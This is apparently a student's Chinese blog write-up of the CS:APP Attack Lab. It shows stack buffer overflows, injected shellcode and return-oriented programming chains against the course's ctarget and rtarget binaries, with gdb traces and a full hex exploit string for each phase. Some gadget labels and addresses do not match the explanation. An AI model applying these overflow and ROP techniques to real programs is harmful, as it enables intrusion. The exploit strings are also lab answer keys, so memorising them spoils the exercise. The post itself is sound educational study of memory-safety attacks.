---
title: 'CS:APP - Attack Lab 笔记'
date: 2018-08-29 17:48:58
categories:
	- 学习笔记
tags:
	- CSAPP
	- C
	- 学习笔记
---

本次 Lab 是通过利用缓冲区溢出等漏洞来改变代码的行为。攻击的方式有将机器码写入栈中、利用已有汇编代码通过 `ret` 跳转来依次执行所需汇编代码等。

## phase 1

touch1 不需要写汇编代码，只要利用一定长度的字符串修改函数的返回地址即可。

首先是 `test`，它会调用 `getbuf` 函数处理用户输入：

```c
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}
```

<!-- more -->

`getbuf` 的代码如下：

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

正常情况下调用完 `getbuf()` 后会返回 `test` 继续执行剩下的部分，但是我们要利用 `getbuf` 中的缓冲区漏洞，使其运行 `touch1`。

``` c
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

先来看一下相关函数的汇编代码：

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

正常情况下运行完 `getbuf` 函数后会返回 `test` 继续运行的，但是我们可以通过为 `Gets` 函数提供过长的字符串，以覆盖原来的返回地址。

`getbuf` 函数首先申请了 `0x28 = 40` 字节的空间，假设此时 `$rsp = 0x100`，那么原本的函数返回地址应该在 `$rsp - 0x28` 处，占用 4 个字节。也就是说，如果我们提供 44 个字节长度的字符串，就能成功覆盖原本的函数返回地址。

所以答案应该是（其实不应该有换行的！）：

```bash
00 00 00 00
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
c0 17 40 00 # touch1 的入口地址
```

## phase 2

这是 `touch2` 的源代码，想要正确运行 `touch2`，只覆盖返回地址已经无法完成要求了，因为它需要传入参数 `val`。

```c
void touch2(unsigned val) {
	vlevel = 2;
	/* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

所以，这里我们要写一些汇编代码。把自己的 `cookie` 值传给 `%rdi` 寄存器（一般由它来传参，也可分析 `touch2` 的汇编码），再跳转到 `touch2` 的入口地址。不过要求所有的跳转都有 `ret` 指令，解决方法是先 `push` 入栈，再 `ret` 即可正确跳转。

`touch2.sol.s` 文件的内容如下：

```assembly
movq $0x59b997fa, %rdi   # 我的 cookie
pushq $0x4017ec          # touch2 的入口
ret
```

> r 开头的寄存器都是 64 位的，加后缀的话应该是 q。

命令行中输入以下指令：

```bash
$ gcc -c touch2.sol.s
$ objdump -d touch2.sol.o > touch2.sol.d
```

得到的 `touch2.sol.d` 文件中包含以下内容：

```assembly

touch2.sol.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

现在我们有了攻击代码了，但是怎么把它“注入”到目标程序里呢？

答案是利用栈。

汇编代码其实是对 0 和 1 的抽象，每一条指令的执行其实就是不断读取文件系统中的 0 和 1，并把它们解释成指令。只要我们把上面的 13 个字节写到某个地方，再通过 `touch1` 中的方法，强制跳转到攻击代码的入口处，就能达到目的了。

这里，我们在栈里存放攻击代码（其实我也只知道在栈里存放代码），只要把 `touch1` 中的最后 4 个字节替换成栈中的地址 `addr`，然后把 13 字节的攻击代码放到 `addr` 处，就可能成功过关了。

现在我们来查看一下栈的地址。

```bash
(gdb) disas getbuf 
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.

# 在修改完栈指针 rsp 后设置断点

(gdb) break *0x4017ac
Breakpoint 1 at 0x4017ac: file buf.c, line 14.

# 运行程序

(gdb) run -q < touch2.sol.txt 
Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q < touch2.sol.txt
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:14
14	buf.c: 没有那个文件或目录.

# 相看寄存器状态，主要是 rsp 寄存器的

(gdb) info registers 
rax            0x0	0
rbx            0x55586000	1431855104
rcx            0xc	12
rdx            0x7ffff7dd3780	140737351858048
rsi            0xc	12
rdi            0x60601c	6316060
rbp            0x55685fe8	0x55685fe8
rsp            0x5561dc78	0x5561dc78
r8             0x7ffff7fde700	140737354000128
r9             0xc	12
r10            0x4032b4	4207284
r11            0x7ffff7b7f970	140737349417328
r12            0x2	2
r13            0x0	0
r14            0x0	0
r15            0x0	0
rip            0x4017ac	0x4017ac <getbuf+4>
eflags         0x216	[ PF AF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
---Type <return> to continue, or q <return> to quit---q
Quit
```

可以看到 `%rsp` 寄存器的值是 `0x5561dc78`，所以把最后四个字节修改成它就好了。

以下是答案：

```bash
48 c7 c7 fa 
97 b9 59 68 
ec 17 40 00 
c3 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

这里我们修改返回地址，这样下一条指令就会是栈顶处的攻击代码，从而完成进入 `touch2` 的准备，并进入 `touch2`。

## phase 3

`touch3` 相比更加麻烦了，因为它要求把 `cookie` 以字符串的形式传入，并调用 `hexmatch` 函数进入匹配。而 `hexmatch` 函数在匹配时会修改栈内的数据，这样我们就要小心选择位置来存放 `cookie`。

使用 `man ascii` 在命令行下相看其 `ascii` 编码。

我的是：

```bash
35 39 62 39 39 37 66 61
```

`touch2 ` 与 `touch3` 有着一些相似性，这里我们先修改一下 `touch2` 的答案，看看情况。

```bash
48 c7 c7 fa 
97 b9 59 68 
ec 17 40 00 
c3 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

尝试运行：

```bash
(gdb) run -q -i touch3.sol.r.txt 
Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q -i touch3.sol.r.txt
Cookie: 0x59b997fa

Breakpoint 1, 0x000000000040190b in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73	visible.c: 没有那个文件或目录.

# 在调用 hexmatch 前打印栈顶，10 进制形式的

(gdb) x/20w 0x5561dc78
0x5561dc78:	1075378792	49920	0	0
0x5561dc88:	0	0	0	0
0x5561dc98:	0	0	1431855104	0
0x5561dca8:	9	0	4202276	0
0x5561dcb8:	0	0	-185273100	-185273100

# 转化为 16 进制形式的数字

(gdb) print /x 10
$1 = 0xa
(gdb) x/20w 0x5561dc78

# 正是我们的攻击代码，不过是反向存放的
0x5561dc78:	0x4018fa68	0x0000c300	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x00000000	0x00000000	0x55586000	0x00000000
0x5561dca8:	0x00000009	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
(gdb) delete
删除所有断点吗？ (y or n) y

# 调用完 hexmatch 后打印栈顶，查看其修改

(gdb) break *0x401916
Breakpoint 2 at 0x401916: file visible.c, line 73.
(gdb) run -q -i touch3.sol.r.txt 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q -i touch3.sol.r.txt
Cookie: 0x59b997fa

Breakpoint 2, 0x0000000000401916 in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73	in visible.c
(gdb) x/20w 0x5561dc78

# 大概 40 个字节都被修改了
0x5561dc78:	0x383e4500	0xc4aff7fc	0x00606010	0x00000000
0x5561dc88:	0x55685fe8	0x00000000	0x00000004	0x00000000
0x5561dc98:	0x00401916	0x00000000	0x55586000	0x00000000
0x5561dca8:	0x00000009	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
(gdb) 
```

通过上述实验，我们发现大概有 40 个字节被 `hexmatch` 覆盖了，所以 `cookie` 字符串不能放在那里。攻击代码无所谓，因为它们会最先被运行，然后就没有用处了，覆盖也无妨。

在 `0x5561dcb8` 处我们发现有 8 个字节的空间，正好可以放下 `cookie`。

然后就可以写攻击代码了：

```assembly
push $0x4018fa
mov $0x5561dcb8, %rdi
ret
```

最终答案：

```bash
68 fa 18 40  00 48 c7 c7  b8 dc 61 55  c3 00 00 00 # 汇编码
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00  78 dc 61 55  00 00 00 00 # 栈顶
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
35 39 62 39  39 37 66 61                           # cookie
```

## phase 4

先使用 `objdump -d rtarget > rtarget.txt` 命令，方便查看机器码。

```assembly
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   
```

以下是对照表：

![movq](/CS-APP-Attack-Lab-笔记/movq.PNG)

![movl](/CS-APP-Attack-Lab-%E7%AC%94%E8%AE%B0/movl.PNG)

因为要靠 `ret` 来跳转，所以我们只关心 `c3` 字节出现的地方。经过细心地排查，终于在这里找到了我们想要的 gadget：

```assembly
# gadget1
# 48 89 c7
# 90
# c3
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

# gadget2
# 58
# 90
# c3
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
```

没错，就是位于 `0x4019c5` 的指令与位于 `0x4019cc` 的指令！如下：

```assembly
movq %rax, %rdi # 48 80 c7
nop             # 90
ret             # c3
```

```assembly
popq %rax       # 58
nop             # 90
ret             # c3
```

通过这两个 gadget，我们就可以完成 level 4 了。具体操作如下：

1. 前 `0x28` 个字节没有用处，因为栈上的指令无法执行，所以从第 41 个字节开始，写入 `gadget1` 的地址。（因为是 64 位系统，后面要补 4 字节 0）
2. 从第 49 个字节开始，写入 `cookie`，这样 `popq` 指令就能把 `cookie` 传入 `%rax` 寄存器中。
3. 紧跟着是 `gadget2` 的地址，这样 `ret` 指令就会跳转到 `gadget2` 的入口。
4. `gadget2` 中会把 `%rax` 中的值传给 `%rdi`，然后执行 `ret` 指令。因为我们要进入 `touch2`，所以接下来要写入 `touch2` 的入口地址。

最终答案为：

```bash
00 00 00 00  00 00 00 00  
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
cc 19 40 00  00 00 00 00 # gadget1
fa 97 b9 59  00 00 00 00 # cookie
c5 19 40 00  00 00 00 00 # gadget2
ec 17 40 00  00 00 00 00 # touch2
```

## phase 5

第 5 部分很复杂，而且只有 5 分，教授似乎是把它当成了一个 bonus，鼓励学有余力的同学去探索。

先把 `rtarget` 反汇编：

``` bash
$ objdump -d rtarget > rtarget.txt
```

然后找到 `start_farm` 与 `end_farm` 之间的部分。那是有我们需要的 ROP 攻击代码。

下面是我整理出来的可用于攻击的代码，入口地址可能会不一样，需要根据自己的情况作调整。（效果一致的代码被省略）

```assembly
# 1
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

# 2
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

# 3
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

# 4
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

# 5
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

# 6
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

# 7
0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

# 8
0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   
```

整理过后，是这个样子：

```assembly
# 1
0x4019a2    48 89 c7 movq %rax, %rdi
            c3       retq
# 2
0x4019ab    58       popq %rax
            90
            c3       retq
# 3         
0x4019dc    5c       popq %rsp
            89 c2
            90
            c3       retq
# 4
0x401a06    48 89 e0 movq %rsp, %rax
            c3       retq
            
# 5
0x401a13    89 ce    movl %ecx, %esi
			90
			90
			c3       retq

# 6
0x401a34    89 d1    movl %edx, %ecx
            38 c9
            c3       retq
            
# 7
0x401a3c    89 e0    movl %esp, %eax
            c3       retq

# 8
0x401a42    89 c2    movl %eax, %edx
            84 c0
            c3       retq
```

简化版视图：

```assembly
# 1
0x4019a2     movq %rax, %rdi
# 2
0x4019ab     popq %rax
# 3         
0x4019dc     popq %rsp
# 4
0x401a06     movq %rsp, %rax
# 5
0x401a13     movl %ecx, %esi
# 6
0x401a34     movl %edx, %ecx
# 7
0x401a3c     movl %esp, %eax
# 8
0x401a42     movl %eax, %edx
```

上面这些都是我在解题时找出的攻击代码，但是，只依靠这些是无法通过 `phase 5` 的。我们来看一下为什么。

很明显，我们要把转换成 `ascii` 后的字符串写入栈中，在 `phase 3` 中就是这样做的。然后，确定字符串在栈中的地址。问题就在确定地址上。

`ctarget` 中我们可以查看栈的状态，来确定存放地址，但在 `rtarget` 中，使用了栈随机化技术，同一行汇编代码在每次运行中也会有不一样的栈顶地址，所以这条路行不通。那么，我们只能利用字符串在栈中的相对位置来确定地址了。可是上面列出的几个语句并没有加法运算操作，那么怎么办呢？

其实答案已经给我们了，再次回到 `farm`，看到这样一个函数：

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

`lea` 是 load effective address 的简称，它只是简单地计算出地址，不会取出地址中存放的内容，经常会用作简单运算，就像这里，把 `$rdi + $rsi` 的结果赋给了 `%rax`。

这样，我们就可以开始写攻击代码了 ，思路是：

1. 获取栈顶地址
2. 将此地址交给 `%rdi`
3. 获取 `cookie` 字符串相对于栈顶的偏移 `offset`
4. 将 `offset` 交给 `%rsi`
5. 利用 `lea` 计算实际地址 `addr`
6. 将 `addr` 交给 `%rdi`（一般用它传参，实际情况看汇编代码）
7. 跳转到 `touch3`

代码实现如下：

```assembly
# 汇编代码                                栈
retq # 函数返回，进入攻击代码               | 0x401a06
movq %rsp, %rax        # 4: 0x401a06
retq # 得到了栈顶地址，就是右边      %rsp -> | 0x4019a2
movq %rax, %rdi        # 1: 0x4019a2
retq # 将栈顶地址交给 %rdi                 | 0x4019ab
popq %rax              # 2: 0x4019ab     | offset = 0x48
retq # 获取 offset                       | 0x401a42
movl %eax, %edx        # 8: 0x401a42
retq #                                   | 0x401a34
movl %edx, %ecx        # 6: 0x401a34
retq #                                   | 0x401a13
movl %ecx, %esi        # 5: 0x401a13
retq #                                   | 0x4019d6
lea (%rdi, %rsi, 1), %rax
retq # 计算实际地址 addr                   | 0x4019a2
movq %rax, %rdi        # 1: 0x4019a2
retq # 将 addr 交给 %rdi                  | 0x4018fa
# touch3 here                            | cookie
```

按照上述程序，一行一行地执行，得到下列输入，即是答案：

``` bash
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00 
06 1a 40 00  00 00 00 00 
a2 19 40 00  00 00 00 00 
ab 19 40 00  00 00 00 00 
48 00 00 00  00 00 00 00 
42 1a 40 00  00 00 00 00 
34 1a 40 00  00 00 00 00 
27 1a 40 00  00 00 00 00 
d6 19 40 00  00 00 00 00 
a2 19 40 00  00 00 00 00 
fa 18 40 00  00 00 00 00 
35 39 62 39  39 37 66 61
```

